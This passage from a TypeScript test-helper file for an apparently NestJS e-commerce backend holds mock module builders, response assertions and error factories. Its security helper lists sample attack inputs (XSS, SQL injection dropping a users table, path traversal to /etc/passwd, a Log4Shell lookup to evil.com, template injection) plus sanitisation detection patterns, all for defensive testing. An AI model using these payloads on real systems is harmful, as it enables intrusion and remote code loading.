      pricing: { mrp: 100, sellingPrice: 90 },
      inventory: { quantity: 10 },
      ...overrides,
    };
  }
}


/**
 * Test Module Builder
 * Helps create testing modules with proper mocks
 */
export class TestModuleBuilder {
  static async createAuthTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: JwtService,
          useValue: MockServicesFactory.createMockJwtService(),
        },
        {
          provide: ConfigService,
          useValue: MockServicesFactory.createMockConfigService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        {
          provide: TokenDenylistService,
          useValue: MockServicesFactory.createMockTokenDenylistService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createBrandTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: EventEmitter2,
          useValue: MockServicesFactory.createMockEventEmitter(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createCategoryTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        {
          provide: EventEmitter2,
          useValue: MockServicesFactory.createMockEventEmitter(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createProductTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        {
          provide: EventEmitter2,
          useValue: MockServicesFactory.createMockEventEmitter(),
        },
        {
          provide: JwtService,
          useValue: MockServicesFactory.createMockJwtService(),
        },
        {
          provide: ConfigService,
          useValue: MockServicesFactory.createMockConfigService(),
        },
        {
          provide: TokenDenylistService,
          useValue: MockServicesFactory.createMockTokenDenylistService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createBannerTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createAttributeTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createVariantTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        ...customProviders,
      ],
    }).compile();
  }

  static async createOrderTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: EventEmitter2,
          useValue: MockServicesFactory.createMockEventEmitter(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        ...customProviders,
      ],
    }).compile();
  }
}


/**
 * Test Assertions Helper
 * Common assertions for testing
 */
export class TestAssertions {
  static expectValidAuthResponse(response: any) {
    expect(response).toHaveProperty('accessToken');
    expect(response).toHaveProperty('refreshToken');
    expect(response).toHaveProperty('user');
    expect(response.user).toHaveProperty('id');
    expect(response.user).toHaveProperty('email');
    expect(response.user).toHaveProperty('name');
    expect(response.user).toHaveProperty('roles');
    expect(response.user).not.toHaveProperty('password');
  }

  static expectValidUser(user: any) {
    expect(user).toHaveProperty('id');
    expect(user).toHaveProperty('email');
    expect(user).toHaveProperty('name');
    expect(user).toHaveProperty('roles');
    expect(user).toHaveProperty('status');
    expect(user).toHaveProperty('createdAt');
    expect(user).toHaveProperty('updatedAt');
    expect(user).not.toHaveProperty('password');
  }

  static expectValidVariant(variant: any) {
    expect(variant).toHaveProperty('id');
    expect(variant).toHaveProperty('productId');
    expect(variant).toHaveProperty('sku');
    expect(variant).toHaveProperty('isActive');
    expect(variant).toHaveProperty('createdAt');
    expect(variant).toHaveProperty('updatedAt');
  }

  static expectValidVariantListResponse(response: any) {
    expect(response).toHaveProperty('data');
    expect(response).toHaveProperty('total');
    expect(Array.isArray(response.data)).toBe(true);
  }

  static expectValidJwtToken(token: string) {
    expect(token).toBeDefined();
    expect(typeof token).toBe('string');
    expect(token.split('.')).toHaveLength(3); // JWT has 3 parts
  }

  static expectValidProduct(product: any) {
    expect(product).toHaveProperty('id');
    expect(product).toHaveProperty('name');
    expect(product).toHaveProperty('slug');
    expect(product).toHaveProperty('description');
    expect(product).toHaveProperty('categoryId');
    expect(product).toHaveProperty('brandId');
    expect(product).toHaveProperty('sellerId');
    expect(product).toHaveProperty('status');
    expect(product).toHaveProperty('createdAt');
    expect(product).toHaveProperty('updatedAt');
  }

  static expectValidProductListResponse(response: any) {
    expect(response).toHaveProperty('data');
    expect(response).toHaveProperty('total');
    expect(response).toHaveProperty('page');
    expect(response).toHaveProperty('limit');
    expect(response).toHaveProperty('totalPages');
    expect(Array.isArray(response.data)).toBe(true);
  }

  static expectValidProductStatistics(stats: any) {
    expect(stats).toHaveProperty('totalProducts');
    expect(stats).toHaveProperty('draftProducts');
    expect(stats).toHaveProperty('publishedProducts');
    expect(stats).toHaveProperty('lastUpdated');
    expect(typeof stats.totalProducts).toBe('number');
  }

  static expectValidAttribute(attribute: any) {
    expect(attribute).toHaveProperty('id');
    expect(attribute).toHaveProperty('name');
    expect(attribute).toHaveProperty('slug');
    expect(attribute).toHaveProperty('dataType');
    expect(attribute).toHaveProperty('status');
    expect(attribute).toHaveProperty('createdBy');
    expect(attribute).toHaveProperty('createdAt');
    expect(attribute).toHaveProperty('updatedAt');
  }

  static expectValidAttributeStatistics(stats: any) {
    expect(stats).toHaveProperty('totalAttributes');
    expect(stats).toHaveProperty('activeAttributes');
    expect(stats).toHaveProperty('draftAttributes');
    expect(stats).toHaveProperty('deprecatedAttributes');
    expect(stats).toHaveProperty('archivedAttributes');
    expect(stats).toHaveProperty('variantAttributes');
    expect(stats).toHaveProperty('filterableAttributes');
    expect(stats).toHaveProperty('searchableAttributes');
    expect(stats).toHaveProperty('localizableAttributes');
    expect(stats).toHaveProperty('attributesByType');
    expect(stats).toHaveProperty('attributesByGroup');
    expect(stats).toHaveProperty('lastUpdated');
    expect(typeof stats.totalAttributes).toBe('number');
  }

  static expectValidAttributeUsageStats(stats: any) {
    expect(stats).toHaveProperty('attributeId');
    expect(stats).toHaveProperty('totalUsage');
    expect(stats).toHaveProperty('productUsage');
    expect(stats).toHaveProperty('variantUsage');
    expect(stats).toHaveProperty('categoryUsage');
    expect(typeof stats.totalUsage).toBe('number');
  }

  static expectValidAttributeListResponse(response: any) {
    expect(response).toHaveProperty('data');
    expect(response).toHaveProperty('total');
    expect(Array.isArray(response.data)).toBe(true);
  }
}


/**
 * Test Error Helper
 * Provides common error scenarios for testing
 */
export class TestErrorHelper {
  static createDuplicateEmailError() {
    const error = new Error('Unique constraint failed');
    (error as any).code = 'P2002';
    (error as any).meta = { target: ['email'] };
    return error;
  }

  static createDuplicateSlugError() {
    const error = new Error('Unique constraint failed');
    (error as any).code = 'P2002';
    (error as any).meta = { target: ['slug'] };
    return error;
  }

  static createNotFoundError() {
    const error = new Error('Record not found');
    (error as any).code = 'P2025';
    return error;
  }

  static createDatabaseConnectionError() {
    const error = new Error('Database connection failed');
    (error as any).code = 'P1001';
    return error;
  }

  static createValidationError() {
    const error = new Error('Validation failed');
    (error as any).code = 'VALIDATION_ERROR';
    return error;
  }

  static createConflictError() {
    const error = new Error('Conflict error');
    (error as any).code = 'CONFLICT_ERROR';
    return error;
  }

  static createUnauthorizedError() {
    const error = new Error('Unauthorized');
    (error as any).code = 'UNAUTHORIZED';
    return error;
  }

  static createForbiddenError() {
    const error = new Error('Forbidden');
    (error as any).code = 'FORBIDDEN';
    return error;
  }
}

/**
 * Test Performance Helper
 * Utilities for performance testing
 */
export class TestPerformanceHelper {
  static async measureExecutionTime<T>(
    fn: () => Promise<T>,
  ): Promise<{ result: T; duration: number }> {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    const duration = Number(end - start) / 1000000; // Convert to milliseconds
    return { result, duration };
  }

  static expectExecutionTimeUnder(duration: number, maxDuration: number) {
    expect(duration).toBeLessThan(maxDuration);
  }
}

/**
 * Test Security Helper
 * Security-related test utilities
 */
export class TestSecurityHelper {
  static createMaliciousPayloads() {
    return [
      '<script>alert("xss")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
    ];
  }

  static expectSanitizedOutput(output: string) {
    const maliciousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+=/i,
      /drop\s+table/i,
      /union\s+select/i,
    ];

    maliciousPatterns.forEach((pattern) => {
      expect(output).not.toMatch(pattern);
    });
  }
}

/**
 * Test Environment Helper
 * Environment setup utilities
 */
export class TestEnvironmentHelper {
  static setTestEnvironmentVariables() {
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'test-jwt-secret-32-characters-long';
    process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters';
    process.env.DATABASE_URL = 'postgresql://test:test@localhost:5432/test_db';
    process.env.REDIS_URL = 'redis://localhost:6379/1';
  }

  static cleanupTestEnvironment() {
    delete process.env.NODE_ENV;
    delete process.env.JWT_SECRET;
    delete process.env.JWT_REFRESH_SECRET;
    delete process.env.DATABASE_URL;
    delete process.env.REDIS_URL;
  }
}
